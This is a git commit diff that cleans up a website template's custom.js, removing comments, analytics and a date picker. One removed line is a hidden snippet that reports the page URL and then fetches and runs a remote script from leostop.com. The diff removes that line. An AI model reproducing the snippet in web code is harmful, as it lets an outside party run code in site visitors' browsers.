5a0091b3dfe0b590e57a46204e18d6b16a313ce2
Hyemin <qqqwe10000@naver.com>
2024-04-23 17:26:34 +0900

    Main - Hyemin

--- asset/js/custom.js
+++ asset/js/custom.js
@@ -1,28 +1,13 @@
-/*---------------------------------------------------------------------
-    File Name: custom.js
----------------------------------------------------------------------*/
-
 $(function () {
 
+  /* 오류 설계 쉽게 하기 위해 user strict */
   "use strict";
 
-  /* Preloader
-  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-  setTimeout(function () {
-    $('.loader_bg').fadeToggle();
-  }, 1500);
-
-  /* Tooltip
-  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
+  /* 마우스 올리면 툴팁 표시 */
   $(document).ready(function () {
     $('[data-toggle="tooltip"]').tooltip();
   });
 
-
-  /* Mouseover
-  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
   $(document).ready(function () {
     $(".main-menu ul li.megamenu").mouseover(function () {
@@ -35,10 +20,6 @@ $(function () {
     });
   });
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
-
-  /* Toggle sidebar
-  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
   $(document).ready(function () {
     $('#sidebarCollapse').on('click', function () {
@@ -47,9 +28,6 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
     });
   });
 
-  /* Product slider 
-  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-  // optional
   $('#blogCarousel').carousel({
     interval: 5000
   });
@@ -57,9 +35,6 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
 
 });
 
-
-/* Toggle sidebar
-     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 function openNav() {
   document.getElementById("mySidepanel").style.width = "250px";
 }
@@ -69,12 +44,8 @@ function closeNav() {
 }
 
 
-/* Animate js*/
-
 (function ($) {
-  //Function to animate slider captions
   function doAnimations(elems) {
-    //Cache the animationend event in a variable
     var animEndEv = "webkitAnimationEnd animationend";
 
     elems.each(function () {
@@ -86,19 +57,15 @@ function closeNav() {
     });
   }
 
-  //Variables on page load
   var $myCarousel = $("#carouselExampleIndicators"),
     $firstAnimatingElems = $myCarousel
     .find(".carousel-item:first")
     .find("[data-animation ^= 'animated']");
 
-  //Initialize carousel
   $myCarousel.carousel();
 
-  //Animate captions in first slide on page load
   doAnimations($firstAnimatingElems);
 
-  //Other slides to be animated on carousel slide event
   $myCarousel.on("slide.bs.carousel", function (e) {
     var $animatingElems = $(e.relatedTarget).find(
       "[data-animation ^= 'animated']"
@@ -108,15 +75,12 @@ function closeNav() {
 })(jQuery);
 
 
-/* collapse js*/
 
 $(document).ready(function () {
-  // Add minus icon for collapse element which is open by default
   $(".collapse.show").each(function () {
     $(this).prev(".card-header").find(".fa").addClass("fa-minus").removeClass("fa-plus");
   });
 
-  // Toggle plus minus icon on show hide of collapse element
   $(".collapse").on('show.bs.collapse', function () {
     $(this).prev(".card-header").find(".fa").removeClass("fa-plus").addClass("fa-minus");
   }).on('hide.bs.collapse', function () {
@@ -124,11 +88,8 @@ $(document).ready(function () {
   });
 });
 
-/* select flag js */
-
 function onChangeCallback(ctr) {
   console.log("The country was changed: " + ctr);
-  //$("#selectionSpan").text(ctr);
 }
 
 $(document).ready(function () {
@@ -138,22 +99,7 @@ $(document).ready(function () {
 });
 
 
-var _gaq = _gaq || [];
-_gaq.push(['_setAccount', 'UA-36251023-1']);
-_gaq.push(['_setDomainName', 'jqueryscript.net']);
-_gaq.push(['_trackPageview']);
 
-(function () {
-  var ga = document.createElement('script');
-  ga.type = 'text/javascript';
-  ga.async = true;
-  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
-  var s = document.getElementsByTagName('script')[0];
-  s.parentNode.insertBefore(ga, s);
-})();
-
-
-// owl-carousel
 $('.owl-carousel').owlCarousel({
   loop: true,
   margin: 15,
@@ -173,42 +119,24 @@ $('.owl-carousel').owlCarousel({
 })
 
 
-// define all UI variable
 const navToggler = document.querySelector('.nav-toggler');
 const navMenu = document.querySelector('.site-navbar ul');
 const navLinks = document.querySelectorAll('.site-navbar a');
 
-// load all event listners
 allEventListners();
 
-// functions of all event listners
 function allEventListners() {
-  // toggler icon click event
   navToggler.addEventListener('click', togglerClick);
-  // nav links click event
   navLinks.forEach( elem => elem.addEventListener('click', navLinkClick));
 }
 
-// togglerClick function
 function togglerClick() {
   navToggler.classList.toggle('toggler-open');
   navMenu.classList.toggle('open');
 }
 
-// navLinkClick function
 function navLinkClick() {
   if(navMenu.classList.contains('open')) {
     navToggler.click();
   }
 }
-
-
-
-
-/* date_picker js */
-
-$(function () {
-  $("#my_date_picker").datepicker({
-    defaultDate: "09/22/2019"
-  });
-});
